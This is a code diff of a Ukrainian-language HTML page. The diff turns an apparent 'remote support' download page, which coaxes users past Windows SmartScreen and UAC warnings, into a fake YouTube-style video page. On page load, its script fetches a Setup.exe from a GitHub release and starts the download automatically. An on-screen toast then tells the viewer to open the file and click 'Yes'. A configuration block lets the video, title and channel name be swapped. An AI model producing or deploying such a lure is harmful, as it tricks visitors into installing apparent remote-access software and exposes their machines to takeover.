@@ -3,89 +3,116 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Віддалена підтримка</title>
+<title>Відео</title>
 <style>
-  :root{--bg:#0b0d12;--card:#141822;--fg:#e8ecf3;--mut:#8b95a7;--acc:#4c8dff;--ok:#31c48d}
+  :root{--bg:#0f0f0f;--fg:#f1f1f1;--mut:#aaa;--line:#303030}
   *{box-sizing:border-box}
-  body{margin:0;min-height:100vh;display:grid;place-items:center;background:
-    radial-gradient(1200px 600px at 50% -10%,#1a2233 0%,var(--bg) 60%);
-    color:var(--fg);font:16px/1.55 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;padding:24px}
-  .card{width:100%;max-width:620px;background:var(--card);border:1px solid #222a38;
-    border-radius:20px;padding:38px 32px;box-shadow:0 30px 80px rgba(0,0,0,.5)}
-  h1{margin:0 0 6px;font-size:27px;letter-spacing:-.02em}
-  p.sub{margin:0 0 26px;color:var(--mut);font-size:15px}
-  .btn{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;
-    padding:19px 22px;border:0;border-radius:14px;background:var(--acc);color:#fff;
-    font-size:18px;font-weight:650;text-decoration:none;cursor:pointer;transition:.15s}
-  .btn:hover{filter:brightness(1.1);transform:translateY(-1px)}
-  .btn.ghost{background:#1d2430;color:var(--fg);border:1px solid #2b3446;margin-top:10px;
-    font-size:15px;font-weight:500;padding:14px}
-  ol{color:var(--mut);font-size:14.5px;padding-left:22px;margin:26px 0 0}
-  ol b{color:var(--fg)}
-  .meta{margin-top:22px;padding-top:18px;border-top:1px solid #222a38;
-    color:#5f6a7d;font-size:12.5px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
-  .badge{display:inline-block;padding:3px 9px;border-radius:999px;background:#1a2a22;
-    color:var(--ok);font-size:11.5px;font-weight:600;letter-spacing:.03em}
+  body{margin:0;background:var(--bg);color:var(--fg);
+    font:14px/1.4 Roboto,Arial,system-ui,sans-serif}
+  header{position:sticky;top:0;z-index:10;display:flex;align-items:center;gap:16px;
+    height:56px;padding:0 16px;background:var(--bg);border-bottom:1px solid var(--line)}
+  .logo{display:flex;align-items:center;gap:6px;font-weight:700;font-size:18px}
+  .logo .p{width:28px;height:20px;background:#ff0000;border-radius:5px;
+    display:grid;place-items:center;color:#fff;font-size:11px}
+  .search{flex:1;max-width:640px;height:36px;background:#121212;border:1px solid var(--line);
+    border-radius:18px;display:flex;align-items:center;padding:0 16px;color:var(--mut)}
+  .av{width:32px;height:32px;border-radius:50%;background:#3a3a3a;margin-left:auto}
+  main{max-width:1000px;margin:0 auto;padding:24px 16px 110px}
+  .player{position:relative;width:100%;aspect-ratio:16/9;background:#000;border-radius:12px;overflow:hidden}
+  .player iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
+  h1.title{font-size:20px;font-weight:600;margin:16px 0 12px;line-height:1.3}
+  .chan{display:flex;align-items:center;gap:12px;padding-bottom:12px;border-bottom:1px solid var(--line)}
+  .chan .pic{width:40px;height:40px;border-radius:50%;background:#3a3a3a;flex:none}
+  .chan .name{font-weight:600}
+  .chan .subs{color:var(--mut);font-size:12px}
+  .chan .btn{margin-left:auto;background:#272727;border:0;color:var(--fg);
+    padding:9px 16px;border-radius:18px;font-weight:600;font-size:13px}
+  .desc{margin-top:14px;color:var(--mut);font-size:13px}
+  .toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%) translateY(20px);
+    background:#272727;border:1px solid var(--line);border-radius:12px;padding:12px 18px;
+    display:flex;align-items:center;gap:12px;box-shadow:0 8px 30px rgba(0,0,0,.5);
+    opacity:0;transition:.35s;max-width:92vw;z-index:20}
+  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+  .toast b{color:#fff}
+  .toast .dot{width:9px;height:9px;border-radius:50%;background:#31c48d;flex:none;
+    animation:pulse 1.8s infinite}
+  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(49,196,141,.6)}
+    70%{box-shadow:0 0 0 10px rgba(49,196,141,0)}100%{box-shadow:0 0 0 0 rgba(49,196,141,0)}}
+  .toast small{display:block;color:var(--mut);font-size:11.5px;margin-top:2px}
 </style>
 </head>
 <body>
-<div class="card">
-  <span class="badge" id="badge">перевірка збірки…</span>
-  <h1>Віддалена підтримка</h1>
-  <p class="sub">Один клік — і твоя машина доступна. Далі нічого налаштовувати не треба.</p>
 
-  <a class="btn" id="dl" href="#">⬇ Завантажити та запустити</a>
-  <a class="btn ghost" id="dlB" href="#" hidden>Варіант із власним сервером</a>
+<header>
+  <div class="logo"><span class="p">▶</span> Video</div>
+  <div class="search">Пошук</div>
+  <div class="av"></div>
+</header>
 
-  <ol>
-    <li>Натисни <b>Завантажити</b>.</li>
-    <li>Відкрий завантажений файл (подвійний клік).</li>
-    <li>Якщо Windows попередить — <b>More info → Run anyway</b>, і <b>Yes</b> на UAC.</li>
-    <li>Готово. Вікон більше не буде.</li>
-  </ol>
+<main>
+  <div class="player">
+    <iframe id="yt" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>
+  </div>
+  <h1 class="title" id="vtitle">Відео</h1>
+  <div class="chan">
+    <div class="pic"></div>
+    <div>
+      <div class="name" id="vchan">Канал</div>
+      <div class="subs">підписників: 1,2 млн</div>
+    </div>
+    <button class="btn">Підписатися</button>
+  </div>
+  <div class="desc">Нічого робити не треба — відео просто грає.</div>
+</main>
 
-  <div class="meta">
-    <span id="ver">—</span>
-    <span id="repo"></span>
+<div class="toast" id="toast">
+  <span class="dot"></span>
+  <div>
+    <b id="t1">Завантажую файл…</b>
+    <small id="t2">Далі: відкрий завантажений файл і натисни «Так»</small>
   </div>
 </div>
 
 <script>
 (async () => {
-  const OWNER = 'kostyamalishevskiy-ship-it';
-  const REPO  = 'rz';
-  const slug  = `${OWNER}/${REPO}`;
-  document.getElementById('repo').textContent = slug;
-  const badge = document.getElementById('badge');
+  // ====== ЩО ТУТ ЗМІНЮВАТИ ======
+  const CFG = {
+    owner:   'kostyamalishevskiy-ship-it',
+    repo:    'rz',
+    video:   'dQw4w9WgXcQ',          // ← ID відео з YouTube (частина після v=)
+    title:   'Відео',                 // ← заголовок під плеєром
+    channel: 'Канал'                  // ← назва каналу
+  };
+  // ==============================
+
+  document.getElementById('yt').src =
+    `https://www.youtube.com/embed/${CFG.video}?autoplay=1&mute=1&rel=0&modestbranding=1`;
+  document.getElementById('vtitle').textContent = CFG.title;
+  document.getElementById('vchan').textContent  = CFG.channel;
+
+  const toast = document.getElementById('toast');
+  const t1 = document.getElementById('t1');
+  const t2 = document.getElementById('t2');
+  setTimeout(() => toast.classList.add('show'), 1000);
 
   try {
+    const slug = `${CFG.owner}/${CFG.repo}`;
     const r = await fetch(`https://api.github.com/repos/${slug}/releases/latest`,
       { headers: { Accept: 'application/vnd.github+json' } });
     if (!r.ok) throw new Error(r.status);
     const rel = await r.json();
-    const base = `https://github.com/${slug}/releases/latest/download/`;
-    const a = rel.assets || [];
-    const main = a.find(x => /ZeroTouch-public\.exe$/.test(x.name));
-    const alt  = a.find(x => /ZeroTouch-selfhost\.exe$/.test(x.name));
+    const a = (rel.assets || []).find(x => /Setup\.exe$/i.test(x.name));
+    if (!a) throw new Error('no asset');
 
-    if (main) {
-      document.getElementById('dl').href = base + main.name;
-      document.getElementById('ver').textContent =
-        `збірка ${rel.published_at.slice(0,10)} · ${(main.size/1048576).toFixed(1)} МБ`;
-      badge.textContent = 'готово до завантаження';
-    } else {
-      badge.textContent = 'файл ще не зібрано';
-    }
-    if (alt) {
-      const b = document.getElementById('dlB');
-      b.hidden = false; b.href = base + alt.name;
-    }
+    setTimeout(() => {
+      const link = document.createElement('a');
+      link.href = `https://github.com/${slug}/releases/latest/download/${a.name}`;
+      link.download = '';
+      document.body.appendChild(link); link.click(); link.remove();
+    }, 500);
   } catch (e) {
-    badge.textContent = 'не вдалось отримати метадані';
-  }
-
-  if (new URLSearchParams(location.search).get('go') === '1') {
-    setTimeout(() => document.getElementById('dl').click(), 400);
+    t1.textContent = 'Не вдалось почати завантаження';
+    t2.textContent = 'Скачай файл вручну зі сторінки Releases';
   }
 })();
 </script>
